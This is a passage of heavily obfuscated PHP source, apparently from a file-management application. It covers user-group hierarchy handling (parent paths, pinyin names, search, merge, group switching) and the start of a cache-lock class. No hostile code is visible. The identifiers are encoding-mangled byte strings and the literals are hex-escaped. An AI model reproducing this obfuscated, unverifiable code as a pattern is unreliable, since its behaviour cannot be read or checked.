$íÑ’íÍ[$ÙĞ¿ó¦‡[514]] . $íÑ’íÍ[$ÙĞ¿ó¦‡[1809]] . $ÙĞ¿ó¦‡[50] . $»ôü†“[$ÙĞ¿ó¦‡[1809]] . $ÙĞ¿ó¦‡[50]; if ($¸‚¬¢¥§) { $˜éù´ßË = $íÑ’íÍ[$ÙĞ¿ó¦‡[514]] . $íÑ’íÍ[$ÙĞ¿ó¦‡[1809]] . $ÙĞ¿ó¦‡[50]; } $Ş´°ó÷„ = array($ÙĞ¿ó¦‡[580] => array($ÙĞ¿ó¦‡[540], $»ôü†“[$ÙĞ¿ó¦‡[514]] . $»ôü†“[$ÙĞ¿ó¦‡[1809]] . $ÙĞ¿ó¦‡[541])); $ššş§– = array($ÙĞ¿ó¦‡[580] => array($ÙĞ¿ó¦‡[589], "\x72\x65\160\x6c\141\x63\x65\x28\x70\141\162\x65\156\x74\114\x65\166\x65\154\x2c\x27{$³ğú´}\47\x2c\x27{$˜éù´ßË}\x27\x29")); $this->_clearChildrenCache($»ôü†“); $this->where($Ş´°ó÷„)->data($ššş§–)->save(); } public function setNamePinyin($±ºŸàÃê, $ˆ—ìÓÊ = false) { $ƒ¤æ³ÆŸ =& $_SERVER[ê‘³Æ±]; if (!$ˆ—ìÓÊ) { $¯Ï˜¯·ú = $this->getInfoSimple($±ºŸàÃê); $ˆ—ìÓÊ = $¯Ï˜¯·ú[$ƒ¤æ³ÆŸ[32]]; } if (!Input::check($ˆ—ìÓÊ, $ƒ¤æ³ÆŸ[583])) { $this->metaSet($±ºŸàÃê, $ƒ¤æ³ÆŸ[457], null); $this->metaSet($±ºŸàÃê, $ƒ¤æ³ÆŸ[456], null); return; } $ê…İ¶÷â = array($ƒ¤æ³ÆŸ[457] => str_replace($ƒ¤æ³ÆŸ[53], $ƒ¤æ³ÆŸ[12], Pinyin::get($ˆ—ìÓÊ)), $ƒ¤æ³ÆŸ[456] => Pinyin::get($ˆ—ìÓÊ, $ƒ¤æ³ÆŸ[584])); $this->metaSet($±ºŸàÃê, $ê…İ¶÷â); } protected function groupStatus($«ğƒ¸è, $Õ¥íé÷©) { $ÎÒ€“è =& $_SERVER[ê‘³Æ±]; $µÅ¯üÏ = $this->getInfoSimple($«ğƒ¸è); if (!$µÅ¯üÏ) { return !1; } if ($Õ¥íé÷© == $ÎÒ€“è[89]) { $ÑÖÁÜ˜° = $this->parentLevelArray($µÅ¯üÏ[$ÎÒ€“è[514]]); } else { $ÇÌã±–¾ = array($ÎÒ€“è[580] => array($ÎÒ€“è[540], $µÅ¯üÏ[$ÎÒ€“è[514]] . $µÅ¯üÏ[$ÎÒ€“è[1809]] . $ÎÒ€“è[541])); $ÑÖÁÜ˜° = $this->where($ÇÌã±–¾)->field($ÎÒ€“è[1809])->select(); $ÑÖÁÜ˜° = array_to_keyvalue($ÑÖÁÜ˜°, $ÎÒ€“è[12], $ÎÒ€“è[1809]); } $ÑÖÁÜ˜°[] = $µÅ¯üÏ[$ÎÒ€“è[1809]]; $°û‚ø¿ = array(); foreach ($ÑÖÁÜ˜° as $«ğƒ¸è) { $°û‚ø¿[] = array($ÎÒ€“è[1809] => $«ğƒ¸è, $ÎÒ€“è[95] => $ÎÒ€“è[736], $ÎÒ€“è[371] => $Õ¥íé÷©); $this->_clearCache($«ğƒ¸è); } return Model($ÎÒ€“è[1897])->addAll($°û‚ø¿, array(), !0); } protected function groupRemove($Ù¶†Ğ”ª) { $á÷ŒÕí =& $_SERVER[ê‘³Æ±]; $†Áû¸ÖÍ = array($á÷ŒÕí[1809] => $Ù¶†Ğ”ª); $µˆ“®Ùù = $this->where($†Áû¸ÖÍ)->find(); if (!$µˆ“®Ùù || $µˆ“®Ùù[$á÷ŒÕí[491]] == 0) { return !1; } $ÑŒÉÊó = $this->getInfoSimple($µˆ“®Ùù[$á÷ŒÕí[491]]); $this->_changeChildLevel($µˆ“®Ùù, $ÑŒÉÊó, !0); $this->where(array($á÷ŒÕí[491] => $Ù¶†Ğ”ª))->save(array($á÷ŒÕí[491] => $µˆ“®Ùù[$á÷ŒÕí[491]])); Model($á÷ŒÕí[1897])->where($†Áû¸ÖÍ)->delete(); Model($á÷ŒÕí[1898])->where($†Áû¸ÖÍ)->delete(); Model($á÷ŒÕí[819])->groupRootRemove($Ù¶†Ğ”ª); return $this->where($†Áû¸ÖÍ)->delete(); } protected function groupSort($şâêƒÄÅ) { $‹†–öŞ˜ =& $_SERVER[ê‘³Æ±]; $üõç°øª = array(); foreach ($şâêƒÄÅ as $ğ•ªÒÊ» => $º­ó™¯¨) { $üõç°øª[] = array($‹†–öŞ˜[1809], $º­ó™¯¨, $‹†–öŞ˜[1832], $ğ•ªÒÊ» + 1); } $this->saveAll($üõç°øª); } public function listData() { $ŒşÙ‚„ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ŒşÙ‚„[$_SERVER[ê‘³Æ±][366]]); return $ŒşÙ‚„; } private function _makeOrder($õßØ†Ï€ = '') { $õÇ±Ìñ‹ =& $_SERVER[ê‘³Æ±]; $Ş·Çû¸ = array($õÇ±Ìñ‹[1809], $õÇ±Ìñ‹[32], $õÇ±Ìñ‹[1798], $õÇ±Ìñ‹[195]); $éùİœôÕ = array($õÇ±Ìñ‹[441] => $õÇ±Ìñ‹[442], $õÇ±Ìñ‹[443] => $õÇ±Ìñ‹[444]); $ÒûóûÃ½ = Input::get($õÇ±Ìñ‹[448], $õÇ±Ìñ‹[7], $õÇ±Ìñ‹[1813], $Ş·Çû¸); $Ãó·òûË = Input::get($õÇ±Ìñ‹[449], $õÇ±Ìñ‹[7], $õÇ±Ìñ‹[1899], array($õÇ±Ìñ‹[1899], $õÇ±Ìñ‹[443])); $Ãó·òûË = $éùİœôÕ[$Ãó·òûË]; $õßØ†Ï€ = $õßØ†Ï€ . "{$ÒûóûÃ½}\40{$Ãó·òûË}\54\x20\147\x72\x6f\165\160\x49\x44\40\x61\x73\143"; return $this->order($õßØ†Ï€); } public function listChild($Íƒ­ÏÙ) { $²ÇÍ“íú =& $_SERVER[ê‘³Æ±]; $ƒÊìÖöá = $this->where(array($²ÇÍ“íú[491] => $Íƒ­ÏÙ))->_makeOrder()->selectPage(200); $this->_listDataApply($ƒÊìÖöá[$²ÇÍ“íú[366]]); return $ƒÊìÖöá; } public function listByID($üÒÕÑŞÂ) { $Ï¼èäÚ° =& $_SERVER[ê‘³Æ±]; if (!$üÒÕÑŞÂ) { return array(); } $ä‡‹ÏÄÀ = array($Ï¼èäÚ°[1809] => array($Ï¼èäÚ°[7], $üÒÕÑŞÂ)); $“îÒ÷Ó = $this->where($ä‡‹ÏÄÀ)->select(); $“îÒ÷Ó = array_sort_keep($“îÒ÷Ó, $Ï¼èäÚ°[1809], $üÒÕÑŞÂ); $this->_listDataApply($“îÒ÷Ó); return $“îÒ÷Ó; } public function listSearch($ï³×Ú…İ) { $´ûŒØ§ =& $_SERVER[ê‘³Æ±]; $œÖÉÀÉ = $ï³×Ú…İ[$´ûŒØ§[1900]]; $Ó«ò¢æ¾ = isset($ï³×Ú…İ[$´ûŒØ§[1901]]) ? $ï³×Ú…İ[$´ûŒØ§[1901]] : !1; if (!trim($œÖÉÀÉ)) { return !1; } $œÖÉÀÉ = str_replace($´ûŒØ§[1902], $´ûŒØ§[1903], $œÖÉÀÉ); $ó¦Ø¾•Ø = array($´ûŒØ§[1809] => array($´ûŒØ§[380], "{$œÖÉÀÉ}\45"), $´ûŒØ§[32] => array($´ûŒØ§[380], "\x25{$œÖÉÀÉ}\x25"), $´ûŒØ§[989] => $´ûŒØ§[1904]); if ($Ó«ò¢æ¾) { $¿–—šò¢ = $this->getInfoSimple($Ó«ò¢æ¾); $ŒĞáÕä = $¿–—šò¢[$´ûŒØ§[514]] . $Ó«ò¢æ¾ . $´ûŒØ§[541]; $ó¦Ø¾•Ø = array($ó¦Ø¾•Ø, array($´ûŒØ§[514] => array($´ûŒØ§[380], $ŒĞáÕä))); } $ó¦Ø¾•Ø = $this->parseWhereLike($ó¦Ø¾•Ø); $²Ô†«êô = $this->_makeOrder()->where($ó¦Ø¾•Ø)->selectPage(20); $²Ô†«êô = $²Ô†«êô ? $²Ô†«êô : array($´ûŒØ§[366] => array(), $´ûŒØ§[363] => array()); if (!$²Ô†«êô || count($²Ô†«êô[$´ûŒØ§[366]]) < 5 && Input::check($œÖÉÀÉ, $´ûŒØ§[315])) { $ûıÄì™ = $this->groupChildrenAll($Ó«ò¢æ¾); $£Å×ÆÑ¿ = $this->_searchFromMeta($´ûŒØ§[456], $œÖÉÀÉ, 10, $ûıÄì™); $ö‹ÛëûÄ = $this->_searchFromMeta($´ûŒØ§[457], $œÖÉÀÉ, 10, $ûıÄì™); $Ïº»õ¤¤ = array_merge($£Å×ÆÑ¿, $ö‹ÛëûÄ, $²Ô†«êô[$´ûŒØ§[366]]); $²Ô†«êô[$´ûŒØ§[366]] = array_unique_by_key($Ïº»õ¤¤, $´ûŒØ§[1809]); $²Ô†«êô[$´ûŒØ§[363]][$´ûŒØ§[364]] = count($²Ô†«êô[$´ûŒØ§[366]]); $²Ô†«êô[$´ûŒØ§[363]][$´ûŒØ§[365]] = ceil($²Ô†«êô[$´ûŒØ§[363]][$´ûŒØ§[364]] / $²Ô†«êô[$´ûŒØ§[363]][$´ûŒØ§[360]]); } $this->_listDataApply($²Ô†«êô[$´ûŒØ§[366]]); return $²Ô†«êô; } protected function groupChildrenAll($®À¯èÇÌ) { $ë‹€Ã‰ =& $_SERVER[ê‘³Æ±]; if (!$®À¯èÇÌ) { return !1; } if (is_string($®À¯èÇÌ)) { $®À¯èÇÌ = array($®À¯èÇÌ); } $Àê‚ğõÜ = $®À¯èÇÌ; foreach ($®À¯èÇÌ as $±²¤Ññ¥) { $È“ıÜ·û = $this->getInfoSimple($±²¤Ññ¥); $Ü©ì«é¤ = array($ë‹€Ã‰[514] => array($ë‹€Ã‰[380], $È“ıÜ·û[$ë‹€Ã‰[514]] . $±²¤Ññ¥ . $ë‹€Ã‰[541])); $Ó‚‚ı‰ = $this->field($ë‹€Ã‰[1809])->where($Ü©ì«é¤)->select(); $Àê‚ğõÜ = array_merge($Àê‚ğõÜ, array_to_keyvalue($Ó‚‚ı‰, $ë‹€Ã‰[12], $ë‹€Ã‰[1809])); } return array_unique($Àê‚ğõÜ); } private function _searchFromMeta($éÃ°«¼É, $Ú³éà›, $å¤ÏÜí—, $ü÷ö¸¡Î) { $Ã•‰ÕÚ¥ =& $_SERVER[ê‘³Æ±]; $Ú³éà› = strtolower($Ú³éà›); $¸şõœµ = array($Ã•‰ÕÚ¥[95] => $éÃ°«¼É, $Ã•‰ÕÚ¥[371] => array($Ã•‰ÕÚ¥[380], "\x25{$Ú³éà›}\45")); $¸şõœµ = $this->parseWhereLike($¸şõœµ); if ($ü÷ö¸¡Î) { $¸şõœµ[$Ã•‰ÕÚ¥[1809]] = array($Ã•‰ÕÚ¥[7], $ü÷ö¸¡Î); } $éÖ§×§ù = Model($Ã•‰ÕÚ¥[1905])->where($¸şõœµ)->limit($å¤ÏÜí—)->select(); if (!$éÖ§×§ù) { return array(); } $éÖ§×§ù = array_to_keyvalue($éÖ§×§ù, $Ã•‰ÕÚ¥[12], $Ã•‰ÕÚ¥[1809]); $´‰ƒÌ· = $this->where(array($Ã•‰ÕÚ¥[1896] => array($Ã•‰ÕÚ¥[7], $éÖ§×§ù)))->select(); if (!$´‰ƒÌ·) { return array(); } return $´‰ƒÌ·; } protected function _listDataApplyItem($‰åÓâ) { $²¾Õ¸µ® = array($‰åÓâ); $this->_listDataApply($²¾Õ¸µ®); return $²¾Õ¸µ®[0]; } protected function _listDataApply(&$¨‰›Ùö¨) { $ğ°¢¨é =& $_SERVER[ê‘³Æ±]; if (!$¨‰›Ùö¨) { return; } $ñÜÌø = array_to_keyvalue($¨‰›Ùö¨, $ğ°¢¨é[12], $ğ°¢¨é[1809]); $this->_listAppendChildren($¨‰›Ùö¨); $this->_listAppendChildrenMember($¨‰›Ùö¨); $this->_listAppendMeta($¨‰›Ùö¨, $ñÜÌø); $this->_listAppendParent($¨‰›Ùö¨); $this->_listAppendSourceRoot($¨‰›Ùö¨, $ñÜÌø); } private function _listAppendChildren(&$ä¨ óëÅ) { $È³úß‰ =& $_SERVER[ê‘³Æ±]; $èŸÊâë = array_to_keyvalue($ä¨ óëÅ, $È³úß‰[12], $È³úß‰[1809]); $äÍ¼–´Ì = array($È³úß‰[491] => array($È³úß‰[7], $èŸÊâë)); $øƒÏÇ»³ = array($È³úß‰[491], $È³úß‰[1906] => $È³úß‰[493]); $¤¢çò¨² = $this->field($øƒÏÇ»³)->where($äÍ¼–´Ì)->group($È³úß‰[491])->select(); $Ùæ¼¤é = array_to_keyvalue($¤¢çò¨², $È³úß‰[491], $È³úß‰[493]); foreach ($ä¨ óëÅ as &$°„‡Š¼ß) { $¼Í…·Í† = $°„‡Š¼ß[$È³úß‰[1809]]; $°„‡Š¼ß[$È³úß‰[1907]] = isset($Ùæ¼¤é[$¼Í…·Í†]) ? intval($Ùæ¼¤é[$¼Í…·Í†]) : !1; } unset($°„‡Š¼ß); } private function _listAppendChildrenMember(&$•Ş—ƒ‰ì) { $Öáúí˜á =& $_SERVER[ê‘³Æ±]; $Ş·Œ’¢ = array_to_keyvalue($•Ş—ƒ‰ì, $Öáúí˜á[12], $Öáúí˜á[1809]); $Ìä±ã¯Æ = array($Öáúí˜á[1809] => array($Öáúí˜á[7], $Ş·Œ’¢)); $«—œ‹ŞÜ = array($Öáúí˜á[1809], $Öáúí˜á[1906] => $Öáúí˜á[493]); $¯èÀ«ªï = Model($Öáúí˜á[1898])->field($«—œ‹ŞÜ)->where($Ìä±ã¯Æ)->group($Öáúí˜á[1809])->select(); $¯’‹³½¥ = array_to_keyvalue($¯èÀ«ªï, $Öáúí˜á[1809], $Öáúí˜á[493]); foreach ($•Ş—ƒ‰ì as &$ˆµ½Êèú) { $ ©Å£‘… = $ˆµ½Êèú[$Öáúí˜á[1809]]; $ˆµ½Êèú[$Öáúí˜á[1908]] = isset($¯’‹³½¥[$ ©Å£‘…]) ? intval($¯’‹³½¥[$ ©Å£‘…]) : !1; } unset($ˆµ½Êèú); } private function _listAppendMeta(&$¢”áÀ, $ÜİãûúÖ) { $×ßüÙù =& $_SERVER[ê‘³Æ±]; $®ö¼ÇŞ¡ = array($×ßüÙù[1809] => array($×ßüÙù[7], $ÜİãûúÖ)); $´¥êİÎ = Model($×ßüÙù[1897])->where($®ö¼ÇŞ¡)->select(); $´¥êİÎ = array_to_keyvalue_group($´¥êİÎ, $×ßüÙù[1809]); foreach ($´¥êİÎ as &$·§öŠ©¹) { $·§öŠ©¹ = array_to_keyvalue($·§öŠ©¹, $×ßüÙù[95], $×ßüÙù[371]); } unset($·§öŠ©¹); foreach ($¢”áÀ as &$ÈÜÒõ) { $ÈÜÒõ[$×ßüÙù[458]] = array(); if (isset($´¥êİÎ[$ÈÜÒõ[$×ßüÙù[1809]]])) { $ÈÜÒõ[$×ßüÙù[458]] = $´¥êİÎ[$ÈÜÒõ[$×ßüÙù[1809]]]; } } unset($ÈÜÒõ); } protected function parentLevelArray($Û°Ñïº¸) { $ÑÁ‰ÇŞ— =& $_SERVER[ê‘³Æ±]; $Û°Ñïº¸ = explode($ÑÁ‰ÇŞ—[50], trim($Û°Ñïº¸, $ÑÁ‰ÇŞ—[50])); $Û°Ñïº¸ = array_remove_value($Û°Ñïº¸, $ÑÁ‰ÇŞ—[192]); return $Û°Ñïº¸; } private function _listAppendParent(&$„åïõ) { $úÑ“Ä“õ =& $_SERVER[ê‘³Æ±]; $ã«Æ¯ É = array(); foreach ($„åïõ as &$ïŠâ¸ò€) { $ã«Æ¯ É[$ïŠâ¸ò€[$úÑ“Ä“õ[1809]]] = $ïŠâ¸ò€[$úÑ“Ä“õ[32]]; $İˆï´°Â = $this->parentLevelArray($ïŠâ¸ò€[$úÑ“Ä“õ[514]]); foreach ($İˆï´°Â as $¥—õ¦™) { if (!isset($ã«Æ¯ É[$¥—õ¦™])) { $ã«Æ¯ É[$¥—õ¦™] = 0; } } } unset($ïŠâ¸ò€); foreach ($ã«Æ¯ É as $ÈĞ¤ÜË— => $¹¡‘”Ğã) { if ($¹¡‘”Ğã) { continue; } $÷Ğ = $this->getInfoSimple($ÈĞ¤ÜË—); $ã«Æ¯ É[$ÈĞ¤ÜË—] = $÷Ğ[$úÑ“Ä“õ[32]]; } $çÕ¤Õš = $GLOBALS[$úÑ“Ä“õ[6]][$úÑ“Ä“õ[90]][$úÑ“Ä“õ[1909]]; if ($GLOBALS[$úÑ“Ä“õ[496]] == $úÑ“Ä“õ[89]) { $çÕ¤Õš = !1; } foreach ($„åïõ as &$ïŠâ¸ò€) { $İˆï´°Â = $this->parentLevelArray($ïŠâ¸ò€[$úÑ“Ä“õ[514]]); $„’·Âš² = $úÑ“Ä“õ[12]; foreach ($İˆï´°Â as $ÈĞ¤ÜË— => $¥—õ¦™) { if ($çÕ¤Õš && $ÈĞ¤ÜË— == 0) { continue; } $„’·Âš² .= $ã«Æ¯ É[$¥—õ¦™] . $úÑ“Ä“õ[8]; } if ($İˆï´°Â) { $„’·Âš² .= $ïŠâ¸ò€[$úÑ“Ä“õ[32]]; } $ïŠâ¸ò€[$úÑ“Ä“õ[519]] = str_replace($úÑ“Ä“õ[522], $úÑ“Ä“õ[8], $„’·Âš²); } unset($ïŠâ¸ò€); } private function _listAppendSourceRoot(&$åª®Å™™, $¬ÉŠ¨§Õ) { $“–¼·§ =& $_SERVER[ê‘³Æ±]; $âßŸ¹Ûú = Model($“–¼·§[819])->listSourceRoot(SourceModel::TYPE_GROUP, $¬ÉŠ¨§Õ); $âßŸ¹Ûú = array_to_keyvalue($âßŸ¹Ûú, $“–¼·§[498]); $âßŸ¹Ûú = array_remove_key($âßŸ¹Ûú, $“–¼·§[498]); foreach ($åª®Å™™ as &$‘èú²ß) { $‘èú²ß[$“–¼·§[87]] = $âßŸ¹Ûú[$‘èú²ß[$“–¼·§[1809]]] ? $âßŸ¹Ûú[$‘èú²ß[$“–¼·§[1809]]] : array(); } unset($‘èú²ß); } protected function groupMerge($Ö†¥¤Ÿ) { $Ö†¥¤Ÿ = array_values(array_unique($Ö†¥¤Ÿ)); $¤Èœüß³ = array(); for ($éÓšî‰ = 0; $éÓšî‰ < count($Ö†¥¤Ÿ); $éÓšî‰++) { $¬–ñ‚–Ö = !1; for ($ˆ³¬‡Ù = 0; $ˆ³¬‡Ù < count($Ö†¥¤Ÿ); $ˆ³¬‡Ù++) { if ($éÓšî‰ == $ˆ³¬‡Ù) { continue; } if ($this->isParentOf($Ö†¥¤Ÿ[$ˆ³¬‡Ù], $Ö†¥¤Ÿ[$éÓšî‰])) { $¬–ñ‚–Ö = !0; break; } } if (!$¬–ñ‚–Ö) { $¤Èœüß³[] = $Ö†¥¤Ÿ[$éÓšî‰]; } } return $¤Èœüß³; } protected function isParentOf($­ê‡îêö, $¬Ï»ƒ÷Ù) { $÷ñÚåßü =& $_SERVER[ê‘³Æ±]; if (!$­ê‡îêö || !$¬Ï»ƒ÷Ù || $­ê‡îêö == $¬Ï»ƒ÷Ù) { return !1; } $Ö³µ¢Ò£ = $this->getInfoSimple($­ê‡îêö); $“ÂÆÅ¬‡ = $this->getInfoSimple($¬Ï»ƒ÷Ù); $ã„Ã¼çÑ = $Ö³µ¢Ò£[$÷ñÚåßü[514]] . $­ê‡îêö . $÷ñÚåßü[50]; if (substr($“ÂÆÅ¬‡[$÷ñÚåßü[514]], 0, strlen($ã„Ã¼çÑ)) == $ã„Ã¼çÑ) { return !0; } return !1; } public function groupShowRoot($“Ùœãã², $²ï¹ìó = false) { $ó™±Ğ˜î =& $_SERVER[ê‘³Æ±]; $Ô³íŠ‚ò = $this->getInfo($“Ùœãã²); if (!$Ô³íŠ‚ò) { return array(); } $÷úì”‚ñ = $this->parentLevelArray($Ô³íŠ‚ò[$ó™±Ğ˜î[514]]); $”êİÊ¥¾ = array($“Ùœãã²); if (count($÷úì”‚ñ) == 0) { return $”êİÊ¥¾; } if ($²ï¹ìó && count($÷úì”‚ñ) == 1) { return $”êİÊ¥¾; } if (!$Ô³íŠ‚ò[$ó™±Ğ˜î[458]] || !isset($Ô³íŠ‚ò[$ó™±Ğ˜î[458]][$ó™±Ğ˜î[1894]]) || $Ô³íŠ‚ò[$ó™±Ğ˜î[458]][$ó™±Ğ˜î[1894]] == $ó™±Ğ˜î[1863]) { return $this->groupShowRoot($÷úì”‚ñ[count($÷úì”‚ñ) - 1], $²ï¹ìó); } if ($Ô³íŠ‚ò[$ó™±Ğ˜î[458]][$ó™±Ğ˜î[1894]] == $ó™±Ğ˜î[354]) { $úù™¹şá = explode($ó™±Ğ˜î[50], $Ô³íŠ‚ò[$ó™±Ğ˜î[458]][$ó™±Ğ˜î[1895]]); if ($úù™¹şá) { $”êİÊ¥¾ = array_merge($”êİÊ¥¾, $úù™¹şá); } } return $”êİÊ¥¾; } protected function resetParentLevel() { $ì¯üÒ´À =& $_SERVER[ê‘³Æ±]; $ÓçÒŸï‰ = $ì¯üÒ´À[1809]; $–°íÖ…¹ = $this->select(); $–°íÖ…¹ = array_to_keyvalue($–°íÖ…¹, $ÓçÒŸï‰); foreach ($–°íÖ…¹ as $×°ÖÜË) { $ÏÃ‚¹íş = $×°ÖÜË; $ˆÇìùÄÏ = array(); while ($ÏÃ‚¹íş[$ì¯üÒ´À[491]] != 0) { $ˆÇìùÄÏ[] = $ÏÃ‚¹íş[$ì¯üÒ´À[491]]; $ÏÃ‚¹íş = $–°íÖ…¹[$ÏÃ‚¹íş[$ì¯üÒ´À[491]]]; } $ˆÇìùÄÏ[] = 0; $ˆÇìùÄÏ = $ì¯üÒ´À[50] . implode($ì¯üÒ´À[50], array_reverse($ˆÇìùÄÏ)) . $ì¯üÒ´À[50]; $this->setNamePinyin($×°ÖÜË[$ÓçÒŸï‰], $×°ÖÜË[$ì¯üÒ´À[32]]); $this->where(array($ÓçÒŸï‰ => $×°ÖÜË[$ÓçÒŸï‰]))->save(array($ì¯üÒ´À[580] => $ˆÇìùÄÏ)); } return $–°íÖ…¹; } public function groupNameAuto($µÁóÙ¶†, $­ôâùœÑ) { $ùôÆÅì¦ =& $_SERVER[ê‘³Æ±]; $éÄö×†— = $this->where(array($ùôÆÅì¦[395] => $µÁóÙ¶†))->getField($ùôÆÅì¦[32], !0); if (!$éÄö×†— || !in_array($­ôâùœÑ, $éÄö×†—)) { return $­ôâùœÑ; } for ($åƒíË«Ç = 1; $åƒíË«Ç <= count($éÄö×†—) + 1; $åƒíË«Ç++) { $‹·Ì‚Öñ = $­ôâùœÑ . "\x28{$åƒíË«Ç}\x29"; if (!in_array($‹·Ì‚Öñ, $éÄö×†—)) { return $‹·Ì‚Öñ; } } } public function groupSwitch($ëİÔ†¼, $×›¤·ò) { $ÓáÓ¯‹‘ =& $_SERVER[ê‘³Æ±]; $ÓÖäïœ… = array($ÓáÓ¯‹‘[1809] => array($ÓáÓ¯‹‘[7], array($ëİÔ†¼, $×›¤·ò))); $êºöâ‡ß = $this->where($ÓÖäïœ…)->select(); $êºöâ‡ß = array_to_keyvalue($êºöâ‡ß, $ÓáÓ¯‹‘[1809]); if (!isset($êºöâ‡ß[$ëİÔ†¼]) || !isset($êºöâ‡ß[$×›¤·ò]) || $êºöâ‡ß[$ëİÔ†¼][$ÓáÓ¯‹‘[491]] == 0) { return !1; } $ÓÖäïœ… = array($ÓáÓ¯‹‘[1809] => $ëİÔ†¼); $ßÙòä‡Æ = Model($ÓáÓ¯‹‘[1898])->where($ÓÖäïœ…)->select(); if (!$ßÙòä‡Æ) { $ßÙòä‡Æ = array(); } foreach ($ßÙòä‡Æ as $…ıØúÙá) { $Ëîâ´ˆ = $…ıØúÙá[$ÓáÓ¯‹‘[1641]]; $ÓÖäïœ… = array($ÓáÓ¯‹‘[1641] => $Ëîâ´ˆ, $ÓáÓ¯‹‘[1809] => $×›¤·ò); $•»éŞâ = Model($ÓáÓ¯‹‘[1898])->where($ÓÖäïœ…)->find(); if (!$•»éŞâ) { $õÛÑ¿Ñ‹ = array($×›¤·ò => $…ıØúÙá[$ÓáÓ¯‹‘[1910]]); Model($ÓáÓ¯‹‘[534])->userGroupAdd($Ëîâ´ˆ, $õÛÑ¿Ñ‹); } Model($ÓáÓ¯‹‘[534])->userGroupRemove($Ëîâ´ˆ, $ëİÔ†¼); } $ÓÖäïœ… = array($ÓáÓ¯‹‘[405] => 2, $ÓáÓ¯‹‘[491] => 0, $ÓáÓ¯‹‘[404] => 1, $ÓáÓ¯‹‘[498] => array($ÓáÓ¯‹‘[7], array($ëİÔ†¼, $×›¤·ò))); $¯ÎÓ¸à = Model($ÓáÓ¯‹‘[819])->where($ÓÖäïœ…)->field($ÓáÓ¯‹‘[1911])->select(); $¯ÎÓ¸à = array_to_keyvalue($¯ÎÓ¸à, $ÓáÓ¯‹‘[498], $ÓáÓ¯‹‘[396]); $Óëğ½¥œ = !empty($¯ÎÓ¸à[$ëİÔ†¼]) ? $¯ÎÓ¸à[$ëİÔ†¼] : !1; if ($Óëğ½¥œ) { if (!$¯ÎÓ¸à[$×›¤·ò]) { $¯ÎÓ¸à[$×›¤·ò] = Model($ÓáÓ¯‹‘[819])->groupRootAdd($×›¤·ò); } $»™ÒÀ“ö = $¯ÎÓ¸à[$×›¤·ò]; $ÓÖäïœ… = array($ÓáÓ¯‹‘[491] => $Óëğ½¥œ); $¯ÎÓ¸à = Model($ÓáÓ¯‹‘[819])->where($ÓÖäïœ…)->field($ÓáÓ¯‹‘[1912])->select(); if (!$¯ÎÓ¸à) { $¯ÎÓ¸à = array(); } Model($ÓáÓ¯‹‘[819])->moveClearAuth = !1; foreach ($¯ÎÓ¸à as $½øËæ‚) { $­¥ãÓ±Ë = $½øËæ‚[$ÓáÓ¯‹‘[404]] == $ÓáÓ¯‹‘[89] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÓáÓ¯‹‘[819])->move($½øËæ‚[$ÓáÓ¯‹‘[396]], $»™ÒÀ“ö, $­¥ãÓ±Ë); } Model($ÓáÓ¯‹‘[819])->moveClearAuth = !0; $ÓÖäïœ… = array($ÓáÓ¯‹‘[405] => 2, $ÓáÓ¯‹‘[498] => $ëİÔ†¼); $ÉÅÈÊíÑ = array($ÓáÓ¯‹‘[498] => $×›¤·ò); Model($ÓáÓ¯‹‘[1913])->where($ÓÖäïœ…)->save($ÉÅÈÊíÑ); Model($ÓáÓ¯‹‘[1914])->where($ÓÖäïœ…)->save($ÉÅÈÊíÑ); } $this->_changeChildLevel($êºöâ‡ß[$ëİÔ†¼], $êºöâ‡ß[$×›¤·ò], !0); $this->where(array($ÓáÓ¯‹‘[491] => $ëİÔ†¼))->save(array($ÓáÓ¯‹‘[491] => $×›¤·ò)); $this->_clearChildrenCache($êºöâ‡ß[$×›¤·ò]); return !0; } } goto d÷å‘ËæØÊ; FŠÃè†Šñ„: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ù™ê¹û¿ =& $_SERVER[ê‘³Æ±]; if (self::$handle) { return self::$handle; } $ø°®ô°ğ = $GLOBALS[$ù™ê¹û¿[6]][$ù™ê¹û¿[346]]; self::$timeout = $ø°®ô°ğ[$ù™ê¹û¿[834]] ? $ø°®ô°ğ[$ù™ê¹û¿[834]] : 10; $ĞÙÆ„–ƒ = _get($GLOBALS[$ù™ê¹û¿[6]], $ù™ê¹û¿[835]); $‹«âÜí§ = $ø°®ô°ğ[$ù™ê¹û¿[821]] ? $ø°®ô°ğ[$ù™ê¹û¿[821]] : $ù™ê¹û¿[194]; if ($‹«âÜí§ == $ù™ê¹û¿[21] && $ĞÙÆ„–ƒ == $ù™ê¹û¿[13]) { $‹«âÜí§ = $ù™ê¹û¿[194]; } switch ($‹«âÜí§) { case $ù™ê¹û¿[824]: self::$handle = new CacheLockRedis(); break; case $ù™ê¹û¿[825]: self::$handle = new CacheLockMemcached(); break; case $ù™ê¹û¿[21]: self::$handle = new CacheLockDatabase(); break; case $ù™ê¹û¿[194]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ù™ê¹û¿[836], $ù™ê¹û¿[837]); } return self::$handle; } private static function key($ÔÎ¬äÊË) { return $_SERVER[ê‘³Æ±][838] . Cache::key($ÔÎ¬äÊË); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($³¯°Í‡È = '') { self::$errorMsg = $³¯°Í‡È; } public static function lockGlobal($·¶Çº¿, $Õ‡óŠÚ) { return self::lock($·¶Çº¿, $Õ‡óŠÚ, !0); } public static function lock($ŒŒÆê¾ú, $³ùãÃÙÙ = false, $¡¾Ùé– = false) { $ºîË¡¤ =& $_SERVER[ê‘³Æ±]; $³³Ë«¸Ñ = self::init(); $´¡êÎ»Á = self::key($ŒŒÆê¾ú); $³ùãÃÙÙ = $³ùãÃÙÙ ? $³ùãÃÙÙ : self::$timeout; $î£ İî = $³³Ë«¸Ñ->lock($´¡êÎ»Á, $³ùãÃÙÙ); $…•Ÿµû¹ = timeFloat(); if (!$î£ İî) { $³£µÆ§¾ = "\x6c\x6f\x63\x6b\40\x65\x72\162\157\x72\x3b\153\145\171\x3d{$ŒŒÆê¾ú}\x3b\164\x69\x6d\x65\x3d{$³ùãÃÙÙ}\x3b" . self::$errorMsg . $ºîË¡¤[71] . get_caller_msg(); $üâì›Ù‚ = LNG($ºîË¡¤[839]) . "\x28{$³ùãÃÙÙ}\163\51\56" . LNG($ºîË¡¤[840]); $üâì›Ù‚ .= $ºîË¡¤[841]; if (is_string(self::$errorMsg) && self::$errorMsg) { $üâì›Ù‚ = 